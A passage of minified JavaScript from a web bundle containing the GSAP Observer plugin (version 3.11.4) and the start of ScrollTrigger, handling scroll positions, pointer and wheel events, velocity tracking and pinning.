        os: "right",
        os2: "Right",
        d: "width",
        d2: "Width",
        a: "x",
        sc: a2(function(r) {
            return arguments.length
                ? zt.scrollTo(r, qe.sc())
                : zt.pageXOffset || e3[wn] || t3[wn] || lr[wn] || 0;
        }),
    },
    qe = {
        s: Tn,
        p: "top",
        p2: "Top",
        os: "bottom",
        os2: "Bottom",
        d: "height",
        d2: "Height",
        a: "y",
        op: Ct,
        sc: a2(function(r) {
            return arguments.length
                ? zt.scrollTo(Ct.sc(), r)
                : zt.pageYOffset || e3[Tn] || t3[Tn] || lr[Tn] || 0;
        }),
    },
    kt = function(e) {
        return (
            ut.utils.toArray(e)[0] ||
            ("string" == typeof e && !1 !== ut.config().nullTargetWarn
                ? console.warn("Element not found:", e)
                : null)
        );
    },
    f3 = function(e, t) {
        var n = t.s,
            i = t.sc;
        Xr(e) && (e = e3.scrollingElement || t3);
        var s = ce.indexOf(e),
            o = i === qe.sc ? 1 : 2;
        !~s && (s = ce.push(e) - 1), ce[s + o] || e.addEventListener("scroll", Ai);
        var l = ce[s + o],
            a =
                l ||
                (ce[s + o] =
                    a2(l3(e, n), !0) ||
                    (Xr(e)
                        ? i
                        : a2(function(c) {
                            return arguments.length ? (e[n] = c) : e[n];
                        })));
        return (
            (a.target = e),
            l || (a.smooth = "smooth" === ut.getProperty(e, "scrollBehavior")),
            a
        );
    },
    Oi = function(e, t, n) {
        var i = e,
            s = e,
            o = Yr(),
            l = o,
            a = t || 50,
            c = Math.max(500, 3 * a),
            u = function(m, p) {
                var y = Yr();
                p || y - o > a
                    ? ((s = i), (i = m), (l = o), (o = y))
                    : n
                        ? (i += m)
                        : (i = s + ((m - s) / (y - l)) * (o - l));
            };
        return {
            update: u,
            reset: function() {
                (s = i = n ? 0 : i), (l = o = 0);
            },
            getVelocity: function(m) {
                var p = l,
                    y = s,
                    v = Yr();
                return (
                    (m || 0 === m) && m !== i && u(m),
                    o === l || v - l > c
                        ? 0
                        : ((i + (n ? y : -y)) / ((n ? v : o) - p)) * 1e3
                );
            },
        };
    },
    Er = function(e, t) {
        return (
            t && !e._gsapAllow && e.preventDefault(),
            e.changedTouches ? e.changedTouches[0] : e
        );
    },
    bs = function(e) {
        var t = Math.max.apply(Math, e),
            n = Math.min.apply(Math, e);
        return Math.abs(t) >= Math.abs(n) ? t : n;
    },
    I4 = function() {
        (Hr = ut.core.globals().ScrollTrigger) && Hr.core && ma();
    },
    D4 = function(e) {
        return (
            (ut = e || k4()) &&
            typeof document < "u" &&
            document.body &&
            ((zt = window),
                (e3 = document),
                (t3 = e3.documentElement),
                (lr = e3.body),
                (M4 = [zt, e3, t3, lr]),
                ut.utils.clamp,
                (E4 = ut.core.context || function() { }),
                (T3 = "onpointerenter" in lr ? "pointer" : "mouse"),
                (P4 = Xe.isTouch =
                    zt.matchMedia &&
                        zt.matchMedia("(hover: none), (pointer: coarse)").matches
                        ? 1
                        : "ontouchstart" in zt ||
                            navigator.maxTouchPoints > 0 ||
                            navigator.msMaxTouchPoints > 0
                            ? 2
                            : 0),
                (o1 = Xe.eventTypes =
                    (
                        "ontouchstart" in t3
                            ? "touchstart,touchmove,touchcancel,touchend"
                            : "onpointerdown" in t3
                                ? "pointerdown,pointermove,pointercancel,pointerup"
                                : "mousedown,mousemove,mouseup,mouseup"
                    ).split(",")),
                setTimeout(function() {
                    return (R4 = 0);
                }, 500),
                I4(),
                (Ci = 1)),
            Ci
        );
    };
(Ct.op = qe), (ce.cache = 0);
var Xe = (function() {
    function r(t) {
        this.init(t);
    }
    return (
        (r.prototype.init = function(n) {
            Ci || D4(ut) || console.warn("Please gsap.registerPlugin(Observer)"),
                Hr || I4();
            var i = n.tolerance,
                s = n.dragMinimum,
                o = n.type,
                l = n.target,
                a = n.lineHeight,
                c = n.debounce,
                u = n.preventDefault,
                h = n.onStop,
                f = n.onStopDelay,
                d = n.ignore,
                m = n.wheelSpeed,
                p = n.event,
                y = n.onDragStart,
                v = n.onDragEnd,
                S = n.onDrag,
                w = n.onPress,
                C = n.onRelease,
                O = n.onRight,
                D = n.onLeft,
                M = n.onUp,
                I = n.onDown,
                R = n.onChangeX,
                L = n.onChangeY,
                z = n.onChange,
                W = n.onToggleX,
                ue = n.onToggleY,
                te = n.onHover,
                J = n.onHoverEnd,
                U = n.onMove,
                Y = n.ignoreCheck,
                $ = n.isNormalizer,
                fe = n.onGestureStart,
                b = n.onGestureEnd,
                Se = n.onWheel,
                be = n.onEnable,
                Ot = n.onDisable,
                Ue = n.onClick,
                Qe = n.scrollSpeed,
                he = n.capture,
                Ne = n.allowClicks,
                Ge = n.lockAxis,
                Vt = n.onLockAxis;
            (this.target = l = kt(l) || t3),
                (this.vars = n),
                d && (d = ut.utils.toArray(d)),
                (i = i || 1e-9),
                (s = s || 0),
                (m = m || 1),
                (Qe = Qe || 1),
                (o = o || "wheel,touch,pointer"),
                (c = !1 !== c),
                a || (a = parseFloat(zt.getComputedStyle(lr).lineHeight) || 22);
            var st,
                ht,
                _,
                x,
                T,
                P,
                A,
                g = this,
                N = 0,
                E = 0,
                F = f3(l, Ct),
                k = f3(l, qe),
                H = F(),
                Z = k(),
                X =
                    ~o.indexOf("touch") &&
                    !~o.indexOf("pointer") &&
                    "pointerdown" === o1[0],
                q = Xr(l),
                V = l.ownerDocument || e3,
                ne = [0, 0, 0],
                ee = [0, 0, 0],
                Ae = 0,
                we = function() {
                    return (Ae = Yr());
                },
                ot = function(K, B) {
                    return (
                        ((g.event = K) && d && ~d.indexOf(K.target)) ||
                        (B && X && "touch" !== K.pointerType) ||
                        (Y && Y(K, B))
                    );
                },
                Pt = function() {
                    var K = (g.deltaX = bs(ne)),
                        B = (g.deltaY = bs(ee)),
                        Q = Math.abs(K) >= i,
                        G = Math.abs(B) >= i;
                    z && (Q || G) && z(g, K, B, ne, ee),
                        Q &&
                        (O && g.deltaX > 0 && O(g),
                            D && g.deltaX < 0 && D(g),
                            R && R(g),
                            W && g.deltaX < 0 != N < 0 && W(g),
                            (N = g.deltaX),
                            (ne[0] = ne[1] = ne[2] = 0)),
                        G &&
                        (I && g.deltaY > 0 && I(g),
                            M && g.deltaY < 0 && M(g),
                            L && L(g),
                            ue && g.deltaY < 0 != E < 0 && ue(g),
                            (E = g.deltaY),
                            (ee[0] = ee[1] = ee[2] = 0)),
                        (x || _) && (U && U(g), _ && (S(g), (_ = !1)), (x = !1)),
                        P && !(P = !1) && Vt && Vt(g),
                        T && (Se(g), (T = !1)),
                        (st = 0);
                },
                E1 = function(K, B, Q) {
                    (ne[Q] += K),
                        (ee[Q] += B),
                        g._vx.update(K),
                        g._vy.update(B),
                        c ? st || (st = requestAnimationFrame(Pt)) : Pt();
                },
                Ze = function(K, B) {
                    Ge &&
                        !A &&
                        ((g.axis = A = Math.abs(K) > Math.abs(B) ? "x" : "y"), (P = !0)),
                        "y" !== A && ((ne[2] += K), g._vx.update(K, !0)),
                        "x" !== A && ((ee[2] += B), g._vy.update(B, !0)),
                        c ? st || (st = requestAnimationFrame(Pt)) : Pt();
                },
                Je = function(K) {
                    if (!ot(K, 1)) {
                        var B = (K = Er(K, u)).clientX,
                            Q = K.clientY,
                            G = B - g.x,
                            re = Q - g.y,
                            et = g.isDragging;
                        (g.x = B),
                            (g.y = Q),
                            (et ||
                                Math.abs(g.startX - B) >= s ||
                                Math.abs(g.startY - Q) >= s) &&
                            (S && (_ = !0),
                                et || (g.isDragging = !0),
                                Ze(G, re),
                                et || (y && y(g)));
                    }
                },
                de = (g.onPress = function(ge) {
                    ot(ge, 1) ||
                        ((g.axis = A = null),
                            ht.pause(),
                            (g.isPressed = !0),
                            (ge = Er(ge)),
                            (N = E = 0),
                            (g.startX = g.x = ge.clientX),
                            (g.startY = g.y = ge.clientY),
                            g._vx.reset(),
                            g._vy.reset(),
                            Mt($ ? l : V, o1[1], Je, u, !0),
                            (g.deltaX = g.deltaY = 0),
                            w && w(g));
                }),
                k1 = function(K) {
                    if (!ot(K, 1)) {
                        yt($ ? l : V, o1[1], Je, !0);
                        var B = !isNaN(g.y - g.startY),
                            Q =
                                g.isDragging &&
                                (Math.abs(g.x - g.startX) > 3 || Math.abs(g.y - g.startY) > 3),
                            G = Er(K);
                        !Q &&
                            B &&
                            (g._vx.reset(),
                                g._vy.reset(),
                                u &&
                                Ne &&
                                ut.delayedCall(0.08, function() {
                                    if (Yr() - Ae > 300 && !K.defaultPrevented)
                                        if (K.target.click) K.target.click();
                                        else if (V.createEvent) {
                                            var re = V.createEvent("MouseEvents");
                                            re.initMouseEvent(
                                                "click",
                                                !0,
                                                !0,
                                                zt,
                                                1,
                                                G.screenX,
                                                G.screenY,
                                                G.clientX,
                                                G.clientY,
                                                !1,
                                                !1,
                                                !1,
                                                !1,
                                                0,
                                                null
                                            ),
                                                K.target.dispatchEvent(re);
                                        }
                                })),
                            (g.isDragging = g.isGesturing = g.isPressed = !1),
                            h && !$ && ht.restart(!0),
                            v && Q && v(g),
                            C && C(g, Q);
                    }
                },
                n1 = function(K) {
                    return (
                        K.touches &&
                        K.touches.length > 1 &&
                        (g.isGesturing = !0) &&
                        fe(K, g.isDragging)
                    );
                },
                i1 = function() {
                    return (g.isGesturing = !1) || b(g);
                },
                m1 = function(K) {
                    if (!ot(K)) {
                        var B = F(),
                            Q = k();
                        E1((B - H) * Qe, (Q - Z) * Qe, 1),
                            (H = B),
                            (Z = Q),
                            h && ht.restart(!0);
                    }
                },
                x1 = function(K) {
                    if (!ot(K)) {
                        (K = Er(K, u)), Se && (T = !0);
                        var B =
                            (1 === K.deltaMode ? a : 2 === K.deltaMode ? zt.innerHeight : 1) *
                            m;
                        E1(K.deltaX * B, K.deltaY * B, 0), h && !$ && ht.restart(!0);
                    }
                },
                p3 = function(K) {
                    if (!ot(K)) {
                        var B = K.clientX,
                            Q = K.clientY,
                            G = B - g.x,
                            re = Q - g.y;
                        (g.x = B), (g.y = Q), (x = !0), (G || re) && Ze(G, re);
                    }
                },
                W3 = function(K) {
                    (g.event = K), te(g);
                },
                R1 = function(K) {
                    (g.event = K), J(g);
                },
                Sr = function(K) {
                    return ot(K) || (Er(K, u) && Ue(g));
                };
            (ht = g._dc =
                ut
                    .delayedCall(f || 0.25, function() {
                        g._vx.reset(), g._vy.reset(), ht.pause(), h && h(g);
                    })
                    .pause()),
                (g.deltaX = g.deltaY = 0),
                (g._vx = Oi(0, 50, !0)),
                (g._vy = Oi(0, 50, !0)),
                (g.scrollX = F),
                (g.scrollY = k),
                (g.isDragging = g.isGesturing = g.isPressed = !1),
                E4(this),
                (g.enable = function(ge) {
                    return (
                        g.isEnabled ||
                        (Mt(q ? V : l, "scroll", Ai),
                            o.indexOf("scroll") >= 0 && Mt(q ? V : l, "scroll", m1, u, he),
                            o.indexOf("wheel") >= 0 && Mt(l, "wheel", x1, u, he),
                            ((o.indexOf("touch") >= 0 && P4) || o.indexOf("pointer") >= 0) &&
                            (Mt(l, o1[0], de, u, he),
                                Mt(V, o1[2], k1),
                                Mt(V, o1[3], k1),
                                Ne && Mt(l, "click", we, !1, !0),
                                Ue && Mt(l, "click", Sr),
                                fe && Mt(V, "gesturestart", n1),
                                b && Mt(V, "gestureend", i1),
                                te && Mt(l, T3 + "enter", W3),
                                J && Mt(l, T3 + "leave", R1),
                                U && Mt(l, T3 + "move", p3)),
                            (g.isEnabled = !0),
                            ge && ge.type && de(ge),
                            be && be(g)),
                        g
                    );
                }),
                (g.disable = function() {
                    g.isEnabled &&
                        (J3.filter(function(ge) {
                            return ge !== g && Xr(ge.target);
                        }).length || yt(q ? V : l, "scroll", Ai),
                            g.isPressed &&
                            (g._vx.reset(), g._vy.reset(), yt($ ? l : V, o1[1], Je, !0)),
                            yt(q ? V : l, "scroll", m1, he),
                            yt(l, "wheel", x1, he),
                            yt(l, o1[0], de, he),
                            yt(V, o1[2], k1),
                            yt(V, o1[3], k1),
                            yt(l, "click", we, !0),
                            yt(l, "click", Sr),
                            yt(V, "gesturestart", n1),
                            yt(V, "gestureend", i1),
                            yt(l, T3 + "enter", W3),
                            yt(l, T3 + "leave", R1),
                            yt(l, T3 + "move", p3),
                            (g.isEnabled = g.isPressed = g.isDragging = !1),
                            Ot && Ot(g));
                }),
                (g.kill = g.revert =
                    function() {
                        g.disable();
                        var ge = J3.indexOf(g);
                        ge >= 0 && J3.splice(ge, 1), $1 === g && ($1 = 0);
                    }),
                J3.push(g),
                $ && Xr(l) && ($1 = g),
                g.enable(p);
        }),
        ga(r, [
            {
                key: "velocityX",
                get: function() {
                    return this._vx.getVelocity();
                },
            },
            {
                key: "velocityY",
                get: function() {
                    return this._vy.getVelocity();
                },
            },
        ]),
        r
    );
})();
(Xe.version = "3.11.4"),
    (Xe.create = function(r) {
        return new Xe(r);
    }),
    (Xe.register = D4),
    (Xe.getAll = function() {
        return J3.slice();
    }),
    (Xe.getById = function(r) {
        return J3.filter(function(e) {
            return e.vars.id === r;
        })[0];
    }),
    k4() && ut.registerPlugin(Xe);
var j,
    j3,
    _e,
    Pe,
    c1,
    Be,
    F4,
    c2,
    u2,
    er,
    Wn,
    Cn,
    dt,
    A2,
    Pi,
    bt,
    ws,
    Ts,
    K3,
    B4,
    W2,
    L4,
    Lt,
    N4,
    Z4,
    $4,
    j1,
    Mi,
    x6,
    H2,
    hn,
    a1,
    Ms,
    Qr,
    Sn = 1,
    wt = Date.now,
    Y2 = wt(),
    t1 = 0,
    An = 0,
    Cs = function() {
        return (A2 = 1);
    },
    Ss = function() {
        return (A2 = 0);
    },
    w1 = function(e) {
        return e;
    },
    Fr = function(e) {
        return Math.round(1e5 * e) / 1e5 || 0;
    },
    z4 = function() {
        return typeof window < "u";
    },
    U4 = function() {
        return j || (z4() && (j = window.gsap) && j.registerPlugin && j);
    },
    L3 = function(e) {
        return !!~F4.indexOf(e);
    },
    W4 = function(e) {
        return (
            l3(e, "getBoundingClientRect") ||
            (L3(e)
                ? function() {
                    return (Kn.width = _e.innerWidth), (Kn.height = _e.innerHeight), Kn;
                }
                : function() {
                    return N1(e);
                })
        );
    },
    xa = function(e, t, n) {
        var i = n.d,
            s = n.d2,
            o = n.a;
        return (o = l3(e, "getBoundingClientRect"))
            ? function() {
                return o()[i];
            }
            : function() {
                return (t ? _e["inner" + s] : e["client" + s]) || 0;
            };
    },
    ya = function(e, t) {
        return !t || ~O1.indexOf(e)
            ? W4(e)
            : function() {
                return Kn;
            };
    },
    r3 = function(e, t) {
        var n = t.s,
            i = t.d2,
            s = t.d,
            o = t.a;
        return (n = "scroll" + i) && (o = l3(e, n))
            ? o() - W4(e)()[s]
            : L3(e)
                ? (c1[n] || Be[n]) -
                (_e["inner" + i] || c1["client" + i] || Be["client" + i])
                : e[n] - e["offset" + i];
    },
    On = function(e, t) {
        for (var n = 0; n < K3.length; n += 3)
            (!t || ~t.indexOf(K3[n + 1])) && e(K3[n], K3[n + 1], K3[n + 2]);
    },
    l1 = function(e) {
        return "string" == typeof e;
    },
    St = function(e) {
        return "function" == typeof e;
    },
    Br = function(e) {
        return "number" == typeof e;
    },
    Hn = function(e) {
        return "object" == typeof e;
    },
    kr = function(e, t, n) {
        return e && e.progress(t ? 0 : 1) && n && e.pause();
    },
    X2 = function(e, t) {
        if (e.enabled) {
            var n = t(e);
            n && n.totalTime && (e.callbackAnimation = n);
        }
    },
    X3 = Math.abs,
    H4 = "left",
    Y4 = "top",
    y6 = "right",
    v6 = "bottom",
    I3 = "width",
    D3 = "height",
    Vr = "Right",
    jr = "Left",
    Kr = "Top",
    qr = "Bottom",
    $e = "padding",
    qt = "margin",
    yr = "Width",
    b6 = "Height",
    lt = "px",
    f1 = function(e) {
        return _e.getComputedStyle(e);
    },
    va = function(e) {
        var t = f1(e).position;
        e.style.position = "absolute" === t || "fixed" === t ? t : "relative";
    },
    As = function(e, t) {
        for (var n in t) n in e || (e[n] = t[n]);
        return e;
    },
    N1 = function(e, t) {
        var n =
            t &&
            "matrix(1, 0, 0, 1, 0, 0)" !== f1(e)[Pi] &&
            j
                .to(e, {
                    x: 0,
                    y: 0,
                    xPercent: 0,
                    yPercent: 0,
                    rotation: 0,
                    rotationX: 0,
                    rotationY: 0,
                    scale: 1,
                    skewX: 0,
                    skewY: 0,
                })
                .progress(1),
            i = e.getBoundingClientRect();
        return n && n.progress(0).kill(), i;
    },
    Ei = function(e, t) {
        var n = t.d2;
        return e["offset" + n] || e["client" + n] || 0;
    },
    X4 = function(e) {
        var s,
            t = [],
            n = e.labels,
            i = e.duration();
        for (s in n) t.push(n[s] / i);
        return t;
    },
    ba = function(e) {
        return function(t) {
            return j.utils.snap(X4(e), t);
        };
    },
    w6 = function(e) {
        var t = j.utils.snap(e),
            n =
                Array.isArray(e) &&
                e.slice(0).sort(function(i, s) {
                    return i - s;
                });
        return n
            ? function(i, s, o) {
                var l;
                if ((void 0 === o && (o = 0.001), !s)) return t(i);
                if (s > 0) {
                    for (i -= o, l = 0; l < n.length; l++) if (n[l] >= i) return n[l];
                    return n[l - 1];
                }
                for (l = n.length, i += o; l--;) if (n[l] <= i) return n[l];
                return n[0];
            }
            : function(i, s, o) {
                void 0 === o && (o = 0.001);
                var l = t(i);
                return !s || Math.abs(l - i) < o || l - i < 0 == s < 0
                    ? l
                    : t(s < 0 ? i - e : i + e);
            };
    },
    wa = function(e) {
        return function(t, n) {
            return w6(X4(e))(t, n.direction);
        };
    },
    Pn = function(e, t, n, i) {
        return n.split(",").forEach(function(s) {
            return e(t, s, i);
        });
    },
    at = function(e, t, n, i, s) {
        return e.addEventListener(t, n, { passive: !i, capture: !!s });
    },
    rt = function(e, t, n, i) {
        return e.removeEventListener(t, n, !!i);
    },
    Mn = function(e, t, n) {
        return n && n.wheelHandler && e(t, "wheel", n);
    },
    Os = {
        startColor: "green",
        endColor: "red",
        indent: 0,
        fontSize: "16px",
        fontWeight: "normal",
    },
    En = { toggleActions: "play", anticipatePin: 0 },
    f2 = { top: 0, left: 0, center: 0.5, bottom: 1, right: 1 },
    Yn = function(e, t) {
        if (l1(e)) {
            var n = e.indexOf("="),
                i = ~n ? +(e.charAt(n - 1) + 1) * parseFloat(e.substr(n + 1)) : 0;
            ~n && (e.indexOf("%") > n && (i *= t / 100), (e = e.substr(0, n - 1))),
                (e =
                    i +
                    (e in f2
                        ? f2[e] * t
                        : ~e.indexOf("%")
                            ? (parseFloat(e) * t) / 100
                            : parseFloat(e) || 0));
        }
        return e;
    },
    kn = function(e, t, n, i, s, o, l, a) {
        var c = s.startColor,
            u = s.endColor,
            h = s.fontSize,
            f = s.indent,
            d = s.fontWeight,
            m = Pe.createElement("div"),
            p = L3(n) || "fixed" === l3(n, "pinType"),
            y = -1 !== e.indexOf("scroller"),
            v = p ? Be : n,
            S = -1 !== e.indexOf("start"),
            w = S ? c : u,
            C =
                "border-color:" +
                w +
                ";font-size:" +
                h +
                ";color:" +
                w +
                ";font-weight:" +
                d +
                ";pointer-events:none;white-space:nowrap;font-family:sans-serif,Arial;z-index:1000;padding:4px 8px;border-width:0;border-style:solid;";
        return (
            (C += "position:" + ((y || a) && p ? "fixed;" : "absolute;")),
            (y || a || !p) &&
            (C += (i === qe ? y6 : v6) + ":" + (o + parseFloat(f)) + "px;"),
            l &&
            (C +=
                "box-sizing:border-box;text-align:left;width:" +
                l.offsetWidth +
                "px;"),
            (m._isStart = S),
            m.setAttribute("class", "gsap-marker-" + e + (t ? " marker-" + t : "")),
            (m.style.cssText = C),
            (m.innerText = t || 0 === t ? e + "-" + t : e),
            v.children[0] ? v.insertBefore(m, v.children[0]) : v.appendChild(m),
            (m._offset = m["offset" + i.op.d2]),
            Xn(m, 0, i, S),
            m
        );
    },
    Xn = function(e, t, n, i) {
        var s = { display: "block" },
            o = n[i ? "os2" : "p2"],
            l = n[i ? "p2" : "os2"];
        (e._isFlipped = i),
            (s[n.a + "Percent"] = i ? -100 : 0),
            (s[n.a] = i ? "1px" : 0),
            (s["border" + o + yr] = 1),
            (s["border" + l + yr] = 0),
            (s[n.p] = t + "px"),
            j.set(e, s);
    },
    se = [],
    ki = {},
    Ps = function() {
        return wt() - t1 > 34 && (hn || (hn = requestAnimationFrame(h3)));
    },
    V3 = function() {
        (!Lt || !Lt.isPressed || Lt.startX > Be.clientWidth) &&
            (ce.cache++,
                Lt ? hn || (hn = requestAnimationFrame(h3)) : h3(),
                t1 || Z3("scrollStart"),
                (t1 = wt()));
    },
    V2 = function() {
        ($4 = _e.innerWidth), (Z4 = _e.innerHeight);
    },
    Lr = function() {
        ce.cache++,
            !dt &&
            !L4 &&
            !Pe.fullscreenElement &&
            !Pe.webkitFullscreenElement &&
            (!N4 ||
                $4 !== _e.innerWidth ||
                Math.abs(_e.innerHeight - Z4) > 0.25 * _e.innerHeight) &&
            c2.restart(!0);
    },
    N3 = {},
    Ta = [],
    V4 = function r() {
        return rt(le, "scrollEnd", r) || O3(!0);
    },
    Z3 = function(e) {
        return (
            (N3[e] &&
                N3[e].map(function(t) {
                    return t();
                })) ||
            Ta
        );
    },
    Nt = [],
    j4 = function(e) {
        for (var t = 0; t < Nt.length; t += 5)
            (!e || (Nt[t + 4] && Nt[t + 4].query === e)) &&
                ((Nt[t].style.cssText = Nt[t + 1]),
                    Nt[t].getBBox && Nt[t].setAttribute("transform", Nt[t + 2] || ""),
                    (Nt[t + 3].uncache = 1));
    },
    T6 = function(e, t) {
        var n;
        for (bt = 0; bt < se.length; bt++)
            (n = se[bt]) &&
                (!t || n._ctx === t) &&
                (e ? n.kill(1) : n.revert(!0, !0));
        t && j4(t), t || Z3("revert");
    },
    K4 = function(e, t) {
        ce.cache++,
            (t || !a1) &&
            ce.forEach(function(n) {
                return St(n) && n.cacheID++ && (n.rec = 0);
            }),
            l1(e) && (_e.history.scrollRestoration = x6 = e);
    },
    F3 = 0,
    Ca = function() {
        if (Ms !== F3) {
            var e = (Ms = F3);
            requestAnimationFrame(function() {
                return e === F3 && O3(!0);
            });
        }
    },
    O3 = function(e, t) {
        if (!t1 || e) {
            (a1 = le.isRefreshing = !0),
                ce.forEach(function(i) {
                    return St(i) && i.cacheID++ && (i.rec = i());
                });
            var n = Z3("refreshInit");
            B4 && le.sort(),
                t || T6(),
                ce.forEach(function(i) {
                    St(i) && (i.smooth && (i.target.style.scrollBehavior = "auto"), i(0));
                }),
                se.slice(0).forEach(function(i) {
                    return i.refresh();
                }),
                se.forEach(function(i, s) {
                    if (i._subPinOffset && i.pin) {
                        var o = i.vars.horizontal ? "offsetWidth" : "offsetHeight",
                            l = i.pin[o];
                        i.revert(!0, 1), i.adjustPinSpacing(i.pin[o] - l), i.revert(!1, 1);
                    }
                }),
                se.forEach(function(i) {
                    return (
                        "max" === i.vars.end &&
                        i.setPositions(
                            i.start,
                            Math.max(i.start + 1, r3(i.scroller, i._dir))
                        )
                    );
                }),
                n.forEach(function(i) {
                    return i && i.render && i.render(-1);
                }),
                ce.forEach(function(i) {
                    St(i) &&
                        (i.smooth &&
                            requestAnimationFrame(function() {
                                return (i.target.style.scrollBehavior = "smooth");
                            }),
                            i.rec && i(i.rec));
                }),
                K4(x6, 1),
                c2.pause(),
                F3++,
                h3(2),
                se.forEach(function(i) {
                    return St(i.vars.onRefresh) && i.vars.onRefresh(i);
                }),
                (a1 = le.isRefreshing = !1),
                Z3("refresh");
        } else at(le, "scrollEnd", V4);
    },
    Es = 0,
    Vn = 1,
    h3 = function(e) {
        if (!a1 || 2 === e) {
            (le.isUpdating = !0), Qr && Qr.update(0);
            var t = se.length,
                n = wt(),
                i = n - Y2 >= 50,
                s = t && se[0].scroll();
            if (
                ((Vn = Es > s ? -1 : 1),
                    (Es = s),
                    i &&
                    (t1 && !A2 && n - t1 > 200 && ((t1 = 0), Z3("scrollEnd")),
                        (Wn = Y2),
                        (Y2 = n)),
                    Vn < 0)
            ) {
                for (bt = t; bt-- > 0;) se[bt] && se[bt].update(0, i);
                Vn = 1;
            } else for (bt = 0; bt < t; bt++) se[bt] && se[bt].update(0, i);
            le.isUpdating = !1;
        }
        hn = 0;
    },
    Ri = [
        H4,
        Y4,
        v6,
        y6,
        qt + qr,
        qt + Vr,
        qt + Kr,
        qt + jr,
        "display",
        "flexShrink",
        "float",
        "zIndex",
        "gridColumnStart",
        "gridColumnEnd",
        "gridRowStart",
        "gridRowEnd",
        "gridArea",
        "justifySelf",
        "alignSelf",
        "placeSelf",
        "order",
    ],
    jn = Ri.concat([
        I3,
        D3,
        "boxSizing",
        "max" + yr,
        "max" + b6,
        "position",
        qt,
        $e,
        $e + Kr,
        $e + Vr,
        $e + qr,
        $e + jr,
    ]),
    Sa = function(e, t, n) {
        ar(n);
        var i = e._gsap;
        if (i.spacerIsNative) ar(i.spacerState);
        else if (e._gsap.swappedIn) {
            var s = t.parentNode;
            s && (s.insertBefore(e, t), s.removeChild(t));
        }
        e._gsap.swappedIn = !1;
    },
    j2 = function(e, t, n, i) {
        if (!e._gsap.swappedIn) {
            for (var a, s = Ri.length, o = t.style, l = e.style; s--;)
                o[(a = Ri[s])] = n[a];
            (o.position = "absolute" === n.position ? "absolute" : "relative"),
                "inline" === n.display && (o.display = "inline-block"),
                (l[v6] = l[y6] = "auto"),
                (o.flexBasis = n.flexBasis || "auto"),
                (o.overflow = "visible"),
                (o.boxSizing = "border-box"),
                (o[I3] = Ei(e, Ct) + lt),
                (o[D3] = Ei(e, qe) + lt),
                (o[$e] = l[qt] = l[Y4] = l[H4] = "0"),
                ar(i),
                (l[I3] = l["max" + yr] = n[I3]),
                (l[D3] = l["max" + b6] = n[D3]),
                (l[$e] = n[$e]),
                e.parentNode !== t &&
                (e.parentNode.insertBefore(t, e), t.appendChild(e)),
                (e._gsap.swappedIn = !0);
        }
    },
    Aa = /([A-Z])/g,
    ar = function(e) {
        if (e) {
            var s,
                o,
                t = e.t.style,
                n = e.length,
                i = 0;
            for ((e.t._gsap || j.core.getCache(e.t)).uncache = 1; i < n; i += 2)
                (o = e[i + 1]),
                    (s = e[i]),
                    o
                        ? (t[s] = o)
                        : t[s] && t.removeProperty(s.replace(Aa, "-$1").toLowerCase());
        }
    },
    Rn = function(e) {
        for (var t = jn.length, n = e.style, i = [], s = 0; s < t; s++)
            i.push(jn[s], n[jn[s]]);
        return (i.t = e), i;
    },
    Oa = function(e, t, n) {
        for (var l, i = [], s = e.length, o = n ? 8 : 0; o < s; o += 2)
            (l = e[o]), i.push(l, l in t ? t[l] : e[o + 1]);
        return (i.t = e.t), i;
    },
    Kn = { left: 0, top: 0 },
    ks = function(e, t, n, i, s, o, l, a, c, u, h, f, d) {
        St(e) && (e = e(a)),
            l1(e) &&
            "max" === e.substr(0, 3) &&
            (e = f + ("=" === e.charAt(4) ? Yn("0" + e.substr(3), n) : 0));
        var p,
            y,
            v,
            m = d ? d.time() : 0;
        if ((d && d.seek(0), Br(e))) l && Xn(l, n, i, !0);
        else {
            St(t) && (t = t(a));
            var w,
                C,
                O,
                D,
                S = (e || "0").split(" ");
            (v = kt(t) || Be),
                (!(w = N1(v) || {}) || (!w.left && !w.top)) &&
                "none" === f1(v).display &&
                ((D = v.style.display),
                    (v.style.display = "block"),
                    (w = N1(v)),
                    D ? (v.style.display = D) : v.style.removeProperty("display")),
                (C = Yn(S[0], w[i.d])),
                (O = Yn(S[1] || "0", n)),
                (e = w[i.p] - c[i.p] - u + C + s - O),
                l && Xn(l, O, i, n - O < 20 || (l._isStart && O > 20)),
                (n -= n - O);
        }
        if (o) {
            var M = e + n,
                I = o._isStart;
            (p = "scroll" + i.d2),
                Xn(
                    o,
                    M,
                    i,
                    (I && M > 20) ||
                    (!I && (h ? Math.max(Be[p], c1[p]) : o.parentNode[p]) <= M + 1)
                ),
                h &&
                ((c = N1(l)),
                    h && (o.style[i.op.p] = c[i.op.p] - i.op.m - o._offset + lt));
        }
        return (
            d &&
            v &&
            ((p = N1(v)),
                d.seek(f),
                (y = N1(v)),
                (d._caScrollDist = p[i.p] - y[i.p]),
                (e = (e / d._caScrollDist) * f)),
            d && d.seek(m),
            d ? e : Math.round(e)
        );
    },
    Pa = /(webkit|moz|length|cssText|inset)/i,
    Rs = function(e, t, n, i) {
        if (e.parentNode !== t) {
            var o,
                l,
                s = e.style;
            if (t === Be) {
                for (o in ((e._stOrig = s.cssText), (l = f1(e))))
                    !+o &&
                        !Pa.test(o) &&
                        l[o] &&
                        "string" == typeof s[o] &&
                        "0" !== o &&
                        (s[o] = l[o]);
                (s.top = n), (s.left = i);
            } else s.cssText = e._stOrig;
            (j.core.getCache(e).uncache = 1), t.appendChild(e);
        }
    },
    Is = function(e, t) {
        var s,
            o,
            n = f3(e, t),
            i = "_scroll" + t.p2,
            l = function a(c, u, h, f, d) {
                var m = a.tween,
                    p = u.onComplete,
                    y = {};
                return (
                    (h = h || n()),
                    (d = (f && d) || 0),
                    (f = f || c - h),
                    m && m.kill(),
                    (s = Math.round(h)),
                    (u[i] = c),
                    (u.modifiers = y),
                    (y[i] = function(v) {
                        return (
                            (v = Math.round(n())) !== s &&
                                v !== o &&
                                Math.abs(v - s) > 3 &&
                                Math.abs(v - o) > 3
                                ? (m.kill(), (a.tween = 0))
                                : (v = h + f * m.ratio + d * m.ratio * m.ratio),
                            (o = s),
                            (s = Math.round(v))
                        );
                    }),
                    (u.onUpdate = function() {
                        ce.cache++, h3();
                    }),
                    (u.onComplete = function() {
                        (a.tween = 0), p && p.call(m);
                    }),
                    (m = a.tween = j.to(e, u))
                );
            };
        return (
            (e[i] = n),
            (n.wheelHandler = function() {
                return l.tween && l.tween.kill() && (l.tween = 0);
            }),
            at(e, "wheel", n.wheelHandler),
            l
        );
    },
    le = (function() {
        function r(t, n) {
            j3 ||
                r.register(j) ||
                console.warn("Please gsap.registerPlugin(ScrollTrigger)"),
                this.init(t, n);
        }
        return (
